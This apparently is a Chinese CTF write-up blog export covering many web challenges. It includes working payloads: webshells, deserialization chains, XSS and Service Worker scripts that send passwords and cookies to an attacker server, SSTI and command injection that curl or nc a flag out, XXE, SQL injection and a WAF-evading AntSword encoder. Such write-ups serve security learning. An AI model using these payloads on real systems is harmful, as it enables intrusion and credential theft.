123456789101112131415161718192021222324&lt;?phpclass A&amp;#123; protected $store; protected $key; protected $expire; public function __construct&amp;#40;&amp;#41; &amp;#123; $this-&gt;expire =0; $this-&gt;autosave=0; $this-&gt;cache=['filename']; $this-&gt;complete='PD9waHAgQGV2YWwoJF9QT1NUWydhYSddKTs/Pg=='; $this-&gt;key=\"222.php\"; $this-&gt;store=new B&amp;#40;&amp;#41;; &amp;#125;&amp;#125;class B&amp;#123; public function __construct&amp;#40;&amp;#41; &amp;#123; $this-&gt;options=[\"prefix\"=&gt;'php://filter/write=convert.base64-decode/resource=',\"serialize\"=&gt;\"serialize\"]; &amp;#125;&amp;#125;$a=new A&amp;#40;&amp;#41;;echo urlencode&amp;#40;serialize&amp;#40;$a&amp;#41;&amp;#41;; 成功getshell。 [GWCTF 2019]mypassword一道xss，查看login.js，功能是将password记录一下。 12345678910111213if &amp;#40;document.cookie &amp;&amp; document.cookie != ''&amp;#41; &amp;#123; var cookies = document.cookie.split&amp;#40;'; '&amp;#41;; var cookie = &amp;#123;&amp;#125;; for &amp;#40;var i = 0; i &lt; cookies.length; i++&amp;#41; &amp;#123; var arr = cookies[i].split&amp;#40;'='&amp;#41;; var key = arr[0]; cookie[key] = arr[1]; &amp;#125; if&amp;#40;typeof&amp;#40;cookie['user']&amp;#41; != \"undefined\" &amp;&amp; typeof&amp;#40;cookie['psw']&amp;#41; != \"undefined\"&amp;#41;&amp;#123; document.getElementsByName&amp;#40;\"username\"&amp;#41;[0].value = cookie['user']; document.getElementsByName&amp;#40;\"password\"&amp;#41;[0].value = cookie['psw']; &amp;#125;&amp;#125; 登录有有一个feedback，页面源代码中有注释，将许多关键字替换为空，这个可以拼接绕过，最主要的坑是没有提示bot会填表单。 所以我们可以构造一个表单给bot填写，然后跳转到我们的服务器即可，密码就是flag。 1234567&lt;incookieput type=\"text\" name=\"username\"&gt;&lt;incookieput type=\"password\" name=\"password\"&gt;&lt;scrcookieipt scookierc=\"./js/login.js\"&gt;&lt;/scrcookieipt&gt;&lt;scrcookieipt&gt; var psw = docucookiement.getcookieElementsByName&amp;#40;\"password\"&amp;#41;[0].value; docucookiement.locacookietion=\"http://ip:port/?a=\"+psw;&lt;/scrcookieipt&gt; [MRCTF2020]Ezaudit下载源码，是一道伪随机数爆破，告诉了我们前16位为KVQP0LdJKRaV3n9D，使用php_mt_seed工具爆破随机数种子为:1775196155。 1username=1&amp;password=&apos;or 1=1#&amp;Private_key=XuNhoueCDCGc&amp;login=1 [NPUCTF2020]验证🐎审计代码 1first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5&amp;#40;first+keys[0]&amp;#41; === md5&amp;#40;second+keys[0]&amp;#41; 在js中，使用+运算符时会将不是字符串类型的数据转换成字符串类型。如果是数组的话，会首先调用数组类型valueof方法再执行toString方法，将数组转换为字符串类型，值为数组中的值，因为要传递对象，所以用json传值。 1&amp;#123;&quot;e&quot;:&quot;1&quot;,&quot;first&quot;:&quot;1&quot;,&quot;second&quot;:[1]&amp;#125; 接下来就是绕过正则，看一下正则表达式，匹配的是math.******这样的字符串或者字串，***中只能含有数字和一些字符。 1&amp;#40;?:Math&amp;#40;?:\\.\\w+&amp;#41;?&amp;#41;|[&amp;#40;&amp;#41;+\\-*/&amp;|^%&lt;&gt;=,?:]|&amp;#40;?:\\d+\\.?\\d*&amp;#40;?:e\\d+&amp;#41;?&amp;#41; 可以用的字符串只有一个Math，恰好，js中可以定义匿名函数，格式是参数名=&gt;&amp;#40;函数实体&amp;#41;刚好满足正则表达式，想要执行任意命令，首先要获取process对象，但是想要正则表达式，只能靠字符串对象的StringCharCode方法，所以首先要得到一个字符串对象，首先Math是一个对象，之前说过+再字符串拼接时会将对象类型强制转换为字符串类型，所以可以传入参数Math+1这种方法来获得字符串对象，由于过滤了;号，使用逗号作为语句分隔。 12&amp;#40;Math=&gt;&amp;#40;Math=Math.constructor;Math.x=Math.constructor&amp;#40;Math.fromCharCode&amp;#40;114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41&amp;#41;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#41;&amp;#40;Math+1&amp;#41; StringCharCode解析完之后是： 1return process.mainModule.require&amp;#40;'child_process'&amp;#41;.execSync&amp;#40;'cat /flag'&amp;#41;.toString&amp;#40;&amp;#41; 成功获得flag。 [GWCTF 2019]你的名字F12发现Django，模板注入，过滤了&#123;&#123;&#125;&#125;使用&#123;% if … %&#125;&#123;% endif %&#125;绕过，但是很多关键字被过滤了，看了一下别的师傅WP，发现时黑名单逻辑问题&#40;坑，不给源码&#41; 12345678910blacklist = ['import', 'getattr', 'os', 'class', 'subclasses', 'mro', 'request', 'args', 'eval', 'if', 'for', ' subprocess', 'file', 'open', 'popen', 'builtins', 'compile', 'execfile', 'from_pyfile', 'local', 'self', 'item', 'getitem', 'getattribute', 'func_globals', 'config']for no in blacklist: while True: if no in s: s = s.replace&amp;#40;no, ''&amp;#41; else: breakreturn s 可以这样绕过，imposort，只要被替换为空的值再自身的前面就可以，但是最好用的还是最后一项config，因为它在所有黑名单的后面。 1&amp;#123;% iconfigf &apos;&apos;.__claconfigss__.__mconfigro__[2].__subclaconfigsses__&amp;#40;&amp;#41;[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen&amp;#40;&apos;curl http://ip:port/ -d `cat /flag_1s_Hera`;&apos;&amp;#41; %&amp;#125;1&amp;#123;% endiconfigf %&amp;#125; [NESTCTF 2019]Love Math 2长度被限制，不可见字符也被限制了，所以只能用亦或拼凑处$_GET $pi=&amp;#40;is_nan^&amp;#40;6&amp;#41;.&amp;#40;4&amp;#41;&amp;#41;.&amp;#40;tan^&amp;#40;1&amp;#41;.&amp;#40;5&amp;#41;&amp;#41;; payload: 1c=$pi=&amp;#40;is_nan^&amp;#40;6&amp;#41;.&amp;#40;4&amp;#41;&amp;#41;.&amp;#40;tan^&amp;#40;1&amp;#41;.&amp;#40;5&amp;#41;&amp;#41;;$pi=$$pi;$pi&amp;#123;0&amp;#125;&amp;#40;$pi&amp;#123;1&amp;#125;&amp;#41;&amp;0=system&amp;1=cat%20/flag [b01lers2020]Life on Mars随便点点发现一个接口，疑似sql注入，试了一下果然是联合注入，扫荡以下表名 1/query?search=olympus_mons%20union%20select%20&amp;#40;select group_concat&amp;#40;table_name&amp;#41; from information_schema.tables where table_schema=database&amp;#40;&amp;#41;&amp;#41;,222&amp;&amp;#123;&amp;#125;&amp;_=1604822267806 没发现可以的表，扫荡一下库名 1/query?search=olympus_mons%20union%20select%20&amp;#40;select group_concat&amp;#40;schema_name&amp;#41; from information_schema.schemata&amp;#41;,222&amp;&amp;#123;&amp;#125;&amp;_=1604822267806 发现alien_code库，里面有code字段，是flag。 1/query?search=olympus_mons%20union%20select%20&amp;#40;select code from alien_code.code&amp;#41;,222&amp;&amp;#123;&amp;#125;&amp;_=1604822267806 [GXYCTF2019]BabysqliV3.0弱密码admin/password加入后台，读取一下源码 1?file=php://filter/convert.base64-encode/resource=home 发现只允许以upload、home结尾才可以读取，审计以下upload.php，发现存在phar反序列化漏洞，首先随便上传一个文件，获取文件路径和$_session[user]。 ![image-20201108172108685]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201108172108685.png&#41; 123456789101112131415161718192021&lt;?phpclass Uploader&amp;#123; public $Filename; public $cmd; public $token; function __construct&amp;#40;&amp;#41;&amp;#123; $this-&gt;token=\"GXY33ab688d4f7951f53ff12e76befb21a9\"; $this-&gt;cmd=\"highlight_file&amp;#40;'/var/www/html/flag.php'&amp;#41;;\"; $this-&gt;Filename=\"1\"; &amp;#125;&amp;#125;$a=new Uploader&amp;#40;&amp;#41;;$phar = new Phar&amp;#40;\"phar.phar\"&amp;#41;;$phar-&gt;startBuffering&amp;#40;&amp;#41;;$phar-&gt;setStub&amp;#40;\"&lt;?php __HALT_COMPILER&amp;#40;&amp;#41;; ?&gt;\"&amp;#41;; //设置stub，增加gif文件头用以欺骗检测$phar-&gt;setMetadata&amp;#40;$a&amp;#41;; //将自定义meta-data存入manifest$phar-&gt;addFromString&amp;#40;\"test.txt\", \"test\"&amp;#41;; //添加要压缩的文件$phar-&gt;stopBuffering&amp;#40;&amp;#41;;?&gt; 生成phar文件，上传phar文件。 由于我们要在在file_get_contents处触发反序列化，所以我们继续随便上传一个文件，并传入name参数 1phar://之前获取的文件路径 即可触发反序列化漏洞。 [GYCTF2020]Ez_Express打开源码就是一个明显的merge函数的原型链污染，注册的时候用了toUpperCase函数，在toUpperCase&#40;&#41;函数中，字符ı会转变为I，所以直接注册一个ADıIN就自动变成了ADMIN，我们可以看到info路由中返回了一个outputFunctionName，是没有被定义过的，在看到ejs模板中的&lt;%=user%&gt;，那就是污染outputFunctionName，让ejs模板执行javascript代码RCE。 123&amp;#123;&quot;test&quot;:&quot;1&quot;,&quot;__proto__&quot;:&amp;#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.require&amp;#40;&apos;child_process&apos;&amp;#41;.execSync&amp;#40;&apos;cat /flag&apos;&amp;#41;.toString&amp;#40;&amp;#41;//&quot;&amp;#125;&amp;#125;;return global[process].mainModule.require&amp;#40;&apos;child_process&apos;&amp;#41;.execSync&amp;#40;&apos;cat /flag&apos;&amp;#41;.toString&amp;#40;&amp;#41;// [GKCTF2020]EZ三剑客-EzTypecho考点是Typecho反序列化漏洞，审计一下代码，在install.php中找到了两处反序列化点。 ![image-20201110115041051]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201110115041051.png&#41; 这一处因为没有session，所以不能使用，只能看第二处。 ![image-20201110115110344]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201110115110344.png&#41; 触发条件是存在GET start参数，将cookie[‘__typecho_config’]反序列化，但是想到达这里还需要过一处Reffer检验。 ![image-20201110115234196]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201110115234196.png&#41; 将Reffere头设置为同站即可绕过，链子很简单，感兴趣可以自己挖，后续会在我的博客代码审计专题中详细介绍Typecho反序列化漏洞。 poc: 1234567891011121314151617181920212223242526272829&lt;?phpclass Typecho_Feed&amp;#123; private $_type; private $_items = array&amp;#40;&amp;#41;; public function __Construct&amp;#40;&amp;#41;&amp;#123; $this-&gt;_type='RSS 2.0'; $this-&gt;_items['author']=array&amp;#40;\"author\"=&gt;new Typecho_Request&amp;#40;&amp;#41;&amp;#41;; &amp;#125;&amp;#125;class Typecho_Request&amp;#123; private $_params = array&amp;#40;&amp;#41;; private $_filter; public function __Construct&amp;#40;&amp;#41;&amp;#123; $this-&gt;_params['screenName']='cat /flag'; $this-&gt;_filter=['system']; $this-&gt;link=\"1\"; $this-&gt;title=\"2\"; &amp;#125;&amp;#125;$a=array&amp;#40;&amp;#41;;$a['adapter']=new Typecho_Feed&amp;#40;&amp;#41;;$a=serialize&amp;#40;$a&amp;#41;;$b=base64_encode&amp;#40;$a&amp;#41;;echo $b; [第一章 web入门]afr_31/article?name=article 在name处可以进行任意文件读取，不过没有权限读取flag，尝试读取源码，读取/proc/self/cmdline发现存在server.py，但是不知道当前目录路径，可以通过/proc/self/cmd获得当前路径。 1/article?name=../../../../proc/self/cmd/server.py 读到源码，发现存在key.py，设置了secretkey=key，读取一波secretkey 1key = &apos;Drmhze6EPcv0fN_81Bj-nA&apos; 在源码中发现可以控制session中n1code的值来进行模板注入，我们也得到了secretkey。 123if session[&apos;n1code&apos;] is not None: template = &apos;&apos;&apos;&amp;lt;h1&amp;gt;N1 Page&amp;lt;/h1&amp;gt; &amp;lt;div class=&quot;row&amp;gt; &amp;lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&amp;gt; Hello : %s, why you don&apos;t look at our &amp;lt;a href=&apos;/article?name=article&apos;&amp;gt;article&amp;lt;/a&amp;gt;? &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &apos;&apos;&apos; % session[&apos;n1code&apos;] session[&apos;n1code&apos;] = None 直接伪造session，读取flag.py。 1&amp;#123;&apos;n1code&apos;: &apos;&amp;#123;&amp;#123;[].__class__.__base__.__subclasses__&amp;#40;&amp;#41;[40]&amp;#40;\\&apos;./flag.py\\&apos;&amp;#41;.read&amp;#40;&amp;#41;&amp;#125;&amp;#125;&apos;&amp;#125; [HFCTF2020]BabyUpload赤裸裸的session伪造，有下载路由，那就下载看看session用的什么引擎处理session。 ![image-20201112143845534]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201112143845534.png&#41; 发现是用的php_binary引擎，那就用该引擎生成一个username=admin的session。 题目中的文件名格式是首先拼接文件名，然后拼接_+hash_file，那么我们让文件名为sess,计算一下hash_file即可得到文件名。 上传后会检查是否存在/var/babyctf/success.txt，使用的是file_exists函数，但是该函数的作用是检测函数或者目录是否存在，所以我们需要创建一个success.txt目录来绕过，那么就让attr=success.txt，随便上传一个文件即可绕过。 [HarekazeCTF2019]Avatar Uploader 1题目给出源码，要满足finfo_file判断为png，同时getimagesize判断不为png。 ![image-20201112151849282]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201112151849282.png&#41; 上传一张这样的图片即可绕过。 [第二章 web进阶]死亡ping命令首先fuzz一下过滤了啥，发现能用的字符只有&lt;&gt;/，但是这些就够了，首先我们需要一个命令分隔符，%0a刚好满足条件 ![image-20201119155659182]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201119155659182.png&#41; 发现成功执行ls命令，但是却没有回显，所以只能想办法将结果带出来，可以看到&gt;可以使用，所以我们可以使用curl命令远程下载一个sh文件，然后在本地执行，在我们的服务器web目录下放置一个1.sh，内容如下： 1cat /F* |nc ip port 然后提交 1ip=127.0.0.1%0acurl ip/1.sh &gt; /tmp/1.sh 修改一下/tmp/1.sh权限，使得它可以执行 1ip=127.0.0.1%0achmod 777 /tmp/1.sh 最后在我们的服务器上监听端口 1nc -lvvp ip port 提交 1ip=127.0.0.1%0ash /tmp/1.sh 即可带出flag [SWPU2019]Web3打开题目，访问upload路由发现权限不够，html页面有个404，发现访问到不存在路由时，会在请求头中返回cookie值，里面有secretkey，可以通过伪造cookie id=1,进入upload路由，在html代码中得到源码，发现在上传压缩包后，对压缩包进行解压缩，然后打开压缩包中的文件，在showflag路由中可以看到flag文件在flask目录下的flag/flag.jpg中，查看师傅们的WP发现，这里可以用软链接创建压缩包，然后让程序去打开软链接，就会自动定位到flag.jpg。 执行下面的目录，建立一个指向flag.jpg的软路由test，/proc/self/cwd为当前目录。 1ln -s /proc/self/cwd/flag/flag.jpg test 然后使用压缩目录将他压缩为压缩包，上传文件，抓包得到flag。 1zip -ry test.zip test ![image-20201123204354248]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201123204354248.png&#41; [BSidesCF 2019]SVGMagic一个SVG的XXE，提交下面的SVG，就能看到flag，flag在当前目录的flag.txt中。 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE svg [&lt;!ENTITY file SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot;&gt; ]&gt; &lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt; &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;&lt;/svg&gt; ![image-20201123210124396]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201123210124396.png&#41; [某入群题]Web2登录使用with rollup构造token为空绕过判定。 1username=admin\\&amp;password=||1 group by token with rollup limit 1 offset 2 ; --+&amp;question=1 进入后台，发现一个数据库连接的东东，应该是mysql服务端伪造了，原理和Redis服务端伪造一样的，mysql服务端伪造主要是使用load data local infile进行任意文件读取，但是现在不知道flag的位置。 在json.php中发现，会列出name参数的目录 ![image-20201128000425882]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201128000425882.png&#41; 但是在后台点开文件，路径却是WebShell大马/webshell/,应该是拼接了webshell。 ![image-20201128000510021]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201128000510021.png&#41; 通过访问头看到，PHP为5.2.17,这个版本存在一个%00字符串截断的问题。 ![image-20201128000241825]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201128000241825.png&#41; 所以在json.php中可以进行目录穿越，并用%00截断拼接的webshell，读取到路径，得到flag。 1/admin/page/json.php?dt=alldata&amp;name=Webshell大马/../../../../../../%00&amp;page=1&amp;limit=15 [GoogleCTF2019 Quals]Bnv抓包提交发现是以json的数据格式发送至服务器解析，我们可以通过修改Content-Type=application/xml，使服务器解析XML格式的数据，所以这里考点就是一个盲注的XXE，payload 1234567891011&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt; &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt; &lt;!ENTITY % para &apos; &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt; &amp;#x25;para2; &apos;&gt; %para;]&gt;&lt;message&gt;1&lt;/message&gt; [CISCN2019 华东北赛区]Web2一个xss，过滤了等于号括号之类的，需要将内容html编码，拿出payload 1&lt;svg&gt;&lt;script&gt;eval&amp;#40;&amp;#34;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#56;&amp;#46;&amp;#49;&amp;#50;&amp;#57;&amp;#46;&amp;#54;&amp;#57;&amp;#46;&amp;#56;&amp;#53;&amp;#58;&amp;#50;&amp;#51;&amp;#51;&amp;#51;&amp;#63;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#61;&amp;#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#34;&amp;#41;&lt;/script&gt; 将cookie leak出来。 ![image-20201128175030199]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201128175030199.png&#41; 访问admin.php，发现一个sql注入点，亦或注入，拿到flag。 [XNUCA2019Qualifier]EasyPHP利用.htaccess自包含执行PHP代码。 1php_value%20auto_prepend_fil%5C%0Ae%20.htaccess%0A%23%3C%3Fphp%20system&amp;#40;&apos;cat%20%2Fflag&apos;&amp;#41;%3B%3F%3E%0A%23%5C","categories":[],"tags":[]},{"title":"西湖论剑赛后复现","slug":"西湖论剑","date":"2020-10-11T16:00:00.000Z","updated":"2020-10-16T11:23:54.881Z","comments":true,"path":"2020/10/12/西湖论剑/","link":"","permalink":"http://yoursite.com/2020/10/12/西湖论剑/","excerpt":"","text":"HardXss这道题打开发现在loginStatus处有一个jsonp，而且在login处能够控制jsonp返回的内容，首先简要的介绍一下jsonp。 jsonp接口是为了方便动态添加跨站脚本而存在的，jsonp接口返回text/javascript形式的数据，在客户端响应。 而在这题中，并不是简单的控制一下cookie的弹出，题目描述：admin收到邮件后会先点开链接然后登录网站，所以我们的目标是拦截admin登录网站的请求，并获得请求内容（admin账号与密码），这就需要用到Service Worker。 如何使用呢？这里有一篇文章介绍了如何使用Service Worker劫持客户请求。Service Worker需要HTTPS请求，可以使用repl.it。 所以我们需要做两件事 iframe跨域加载jsonp用恶意代码注册service worker 使用Service Worker接收fetch事件，并将它弹到自己服务器中 12https://xss.hardxss.xhlj.wetolink.com/loginhttps://auth.hardxss.xhlj.wetolink.com/api/loginStatus 在这里存在一个跨域问题，所以我们只需要拿出常用的iframe，设置document.domain=hardxss.xhlj.wetolink,即可解决 12345678910#1.jsdocument.domain = \"hardxss.xhlj.wetolink.com\";var iframe = document.createElement('iframe');iframe.src = 'https://auth.hardxss.xhlj.wetolink.com';iframe.addEventListener(\"load\", function()&#123; iffLoadover(); &#125;);document.body.appendChild(iframe);exp = `navigator.serviceWorker.register(\"/api/loginStatus?callback=importScripts('https://aa.lifegame.repl.co/2.js');//\")`;function iffLoadover()&#123; iff.contentWindow.eval(exp);&#125; 1234567#2.jsthis.addEventListener('fetch', function (e) &#123; var body = \"&lt;script&gt;location='http://ip:port/1'+location.search;&lt;/script&gt;\"; var init = &#123;headers: &#123;\"Content-Type\": \"text/html\"&#125;&#125;; var res = new Response(body, init); e.respondWith(res.clone());&#125;); 在这段js代码中，我在根域名中注册了一个Service Worker，恶意监听fetch事件，并将事件返回到我的服务器上，admin的登录事件就被捕获。 登入admin，获取flag。 NewUpload这道题是一个普通的文件上传加上了宝塔的WAF和disable_function、open_basedir。 发现PHP不能上传，对这种WAF一般换行可以通杀，WAF还有文件头检测，GET、POST传值检测，所以需要将马简单编码一下（base64或者三次urlencode全编码都行），简单绕一下open_basedir，发现读取flag需要通过readflag获取flag。 本题有两种做法 php-fpm绕过disable_function 由于服务器iis限制，当马很大时base64解码需要耗费大量服务器资源，返回503，所以只能使用三次url编码来绕过 上传一个没有绕过open_basedir的马，修改AntSword编码器，base64和url全编码的编码器都放出来。 1234567891011121314151617181920/** * php::base64编码器 * Create at: 2020/10/08 11:54:20 */'use strict';/** @param &#123;String&#125; pwd 连接密码* @param &#123;Array&#125; data 编码器处理前的 payload 数组* @return &#123;Array&#125; data 编码器处理后的 payload 数组*/module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123; let randomID = `_0x$&#123;Math.random().toString(16).substr(2)&#125;`; data[randomID] = Buffer.from(data['_']).toString('base64'); data[pwd] = data[randomID]; delete data['_']; delete data[randomID]; return data;&#125; 123456789101112131415161718192021222324/** * php::url编码器 * Create at: 2020/10/12 17:16:57 */'use strict';/** @param &#123;String&#125; pwd 连接密码* @param &#123;Array&#125; data 编码器处理前的 payload 数组* @return &#123;Array&#125; data 编码器处理后的 payload 数组*/module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123; function urlencode(e, r) &#123; return ++r ? \"%\" + ([10] + e.charCodeAt().toString(16)).slice(-2) : decodeURI(encodeURIComponent(e)).replace(/[^]/g, urlencode) &#125; let randomID = `_0x$&#123;Math.random().toString(16).substr(2)&#125;`; data[randomID] = Buffer.from(data['_']).toString(); data[pwd]=urlencode(urlencode(data[randomID])); delete data['_']; delete data[randomID]; return data;&#125; 在/tmp下有php-cgi-74.sock文件，直接使用AntSword的插件选择PHP-FPM，一键打通。 lua脚本执行readflag 抓包发现openresty，可以上传lua脚本，并上传.htaccess文件解析luaji脚本即可 12345678910require \"string\"function handle(r) r.content_type = \"text/plain\" if r.method == 'GET' then local a = io.popen('/readflag') local b = a:read(\"*all\") r:puts(b) end return apache2.OKend 123&lt;Files &quot;*.lua&quot;&gt; SetHandler lua-script&lt;/Files&gt; EasyJson查看源码发现使用json_decode获取content，直接使用unicode编码绕过。 payload 123&#123;&quot;\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074&quot;:&quot;\\u003c\\u003f\\u0070\\u0068\\u0070\\u0020\\u0065\\u0076\\u0061\\u006c\\u0028\\u0024\\u005f\\u0050\\u004f\\u0053\\u0054\\u005b\\u0027\\u0061\\u0061\\u0027\\u005d\\u0029\\u003b\\u003f\\u003e&quot;&#125;&#123;&quot;content&quot;:&quot;&lt;?php eval($_POST[&apos;aa&apos;]);?&gt;&quot;&#125; Flagshop这题是一道WebPwn，赛后复现了一下，发现还挺基础的。 通过backend.php读取源码发现存在一个文件写入(能指定偏移)和文件读取，赛后看师傅的WP，发现是通过改写当前进程内存内容，将open函数的地址(file_get_contents基于open函数实现)改写成system函数的地址，那么调用file_get_contents函数就相当于调用system函数。 首先需要读取内存信息/proc/self/maps，该文件包含了当前进程映射的内存区域，我们可以从中得值当前程序调用libc库和偏移地址。 可以得知动态链接库在内存中的地址是0x7ffff5f40000，将该libc库下载下来，可以得到system函数在libc库中的偏移地址，内存地址+偏移地址=真实地址。 使用ida打开，找到system函数在libc库中的偏移地址0x0000000000046590，所以system在内存中的真实地址=0x7ffff5f86590。 得到了system函数的地址，我们还需要得到open函数的地址，可见，当前libc库中并没有open函数，可以去/proc/self/exe文件找一找，该文件存放的是当前进程执行的二进制文件，同样的，将其下载下来，ida打开，可以发现open函数在内存中的偏移为0x0000000000E9F998，也就是15333784。 payload: 1?readfile=/readflag&gt;/tmp/aaa&amp;writefile=/proc/self/mem&amp;buffer=%90%65%f8%f5%ff%7f&amp;offset=15333784","categories":[{"name":"西湖论剑","slug":"西湖论剑","permalink":"http://yoursite.com/categories/西湖论剑/"}],"tags":[]},{"title":"BUUCTF1","slug":"BUUCTF2","date":"2020-10-01T16:00:00.000Z","updated":"2020-10-20T13:24:09.100Z","comments":true,"path":"2020/10/02/BUUCTF2/","link":"","permalink":"http://yoursite.com/2020/10/02/BUUCTF2/","excerpt":"","text":"[CISCN2019 华北赛区 Day1 Web5]CyberPunk打开题目，查看界面源码发现提示?file，于是将源码读取，发现address处没有过滤，在change.php中发现二次注入点 随便注入以下，发现报错，果然就是报错注入了，数据库逛了一圈，啥也没有，发现题目把load_fileBAN了，就试试直接读flag，因为是ciscn的题目，所以flag都在/flag.txt，由于报错长度限制，分两次爆。 12&apos;,`address`= updatexml(1,concat(0x3a,(select substr(load_file(&apos;/flag.txt&apos;),1,25)),0x3a),1)#&apos;,`address`= updatexml(1,concat(0x3a,(select substr(load_file(&apos;/flag.txt&apos;),25,50)),0x3a),1)# [Zer0pts2020]Can you guess it?题目给出源码，看了一下，guess是不可能猜中，也不可能绕过的，所以点肯定在basename($_SERVER[&#39;PHP_SELF&#39;])这里。 basename函数当路径以/结尾时，会返回/前面的内容，当文件名只含有一个非ascii码字符时，basename会将它忽略，所以可以用/index.php/config.php/%ff?source读取flag。 [HFCTF2020]EasyLogin打开看发现是koa框架，网上查一查，koa通常会在controllers目录中存放处理逻辑js代码，通常是放在api.js/user.js中，访问controllser/api.js得到逻辑代码，发现是一道JWT伪造。 当username=admin时，可以访问/flag。 JWT自身加密的问题，我们可以用alg=’none’绕过，只需要绕过下面这一段代码就行。 123if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123; throw new APIError('login error', 'no such secret id');&#125; 这里时一个JS的弱类型问题，以下代码是成立的。 1234const a =[]if(a==0)&#123; console.log(a)&#125; 我们只需要构造secretid=[]即可绕过判断。 12345678910111213141516171819import jwtimport timeimport base64import jsonheaders=&#123;'type':'jwt','alg':\"none\"&#125;payload=&#123;'iat':1587378820,'username':'admin','password':'123','secretid':[]&#125;he=json.dumps(headers)pa=json.dumps(payload)a=base64.b64encode(he.encode('utf-8')).decode('utf-8')b=base64.b64encode(pa.encode('utf-8')).decode('utf-8')print(a+'.'+b) [BJDCTF 2nd]文件探测答开题目，抓包发现提示home.php，进入发现直接跳到了system.php，F12再network处查看网络请求，发现了home.php?file=system请求，试试伪协议读源码。 1file=php://filter/read=convert.base64-encode/resource=home 将home和system的代码都读取出来，再home.php中发现存在admin.php，但是要本地访问，flag也被限制的死死的，于是只能在system.php找找。 1234567891011121314151617181920if (isset($_POST['q1']) &amp;&amp; isset($_POST['q2']) &amp;&amp; isset($_POST['q3']) ) &#123; $url = $_POST['q2'].\".y1ng.txt\"; $method = $_POST['q3']; $str1 = \"~$ python fuck.py -u \\\"\".$url .\"\\\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;\"; echo $str1; if (!preg_match($filter1, $url) )&#123; die($str2); &#125; if (preg_match($filter2, $url)) &#123; die($str3); &#125; if (!preg_match('/^GET/i', $method) &amp;&amp; !preg_match('/^POST/i', $method)) &#123; die($str4); &#125; $detect = @file_get_contents($url, false); print(sprintf(\"$url method&amp;content_size:$method%d\", $detect));&#125; 要求q2必须要以http://127.0.0.1开头，那估计就是用file_get_contents打开admin.php了，发现$url在q2后拼接了字符串，这个可以在q2后加#锚点符或者参数?a=这种形式绕过，最后发现它使用%d来打印返回内容，这肯定要把它改成%s才行。 在官网搜到，sprintf能够指定参数位置%[argnum$][flags][width][.precision] 所以可以指定使用%1$s能够将$detect转变为字符串输出。 1q1=flag&amp;q2=http://127.0.0.1/admin.php?a=%1$s&amp;q3=get 同时在官网可以看到 1notice the double %%, this prints a literal &apos;%&apos; character 两个%%符号会输出真正的%，所以也能利用 1q1=flag&amp;q2=http://127.0.0.1/admin.php?a=&amp;q3=get%s% 成功获得admin.php代码 admin.php的逻辑非常的脆弱，AES-128-CBC的加密数据是存放在session中的，如果不带sessionid访问，加密数据就是空，我们可以构造出加密空数据后的$cipher 12345678&lt;?phpfunction aesEn($data, $key)&#123; $method = &apos;AES-128-CBC&apos;; $iv = md5(&quot;174.0.0.15&quot;,true); return base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));&#125;echo aesEn(&apos;&apos;,&apos;y1ng&apos;); 将上面的输出传给decrypt，即可得到flag。 [GYCTF2020]Ezsqli简单判断一下，是一道数字型盲注，过滤了or、union等字符，首先将数据库版本弄到 1if(ascii(substr((version()),1,1))&gt;52,1,0) 版本是5.7.29，在此版本中，sys增加了可以查看表名的视图 1select group_concat(table_name) from sys.schema_table_statistics where table_schema=database() 得到表名f1ag_1s_h3r3_hhhhh,由于过滤了union，只能使用Row 